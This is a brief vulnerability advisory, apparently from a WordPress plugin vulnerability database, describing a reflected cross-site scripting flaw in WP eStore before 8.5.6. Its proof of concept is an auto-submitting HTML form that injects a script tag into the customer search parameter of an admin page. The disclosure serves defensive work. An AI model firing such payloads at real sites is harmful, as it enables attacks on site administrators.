## WordPress Plugin Vulnerabilities

# WP eStore < 8.5.6 - Reflected XSS in Customer Search

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Make a logged in admin open an HTML file containing:
```
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/admin.php?page=wp\_estore\_customer\_management" method="POST" enctype="multipart/form-data">
<input name="eStore\_customer\_search" value='"><script>alert(123)</script>'>
<input type="submit" value="submit">
</form>
</body>
```
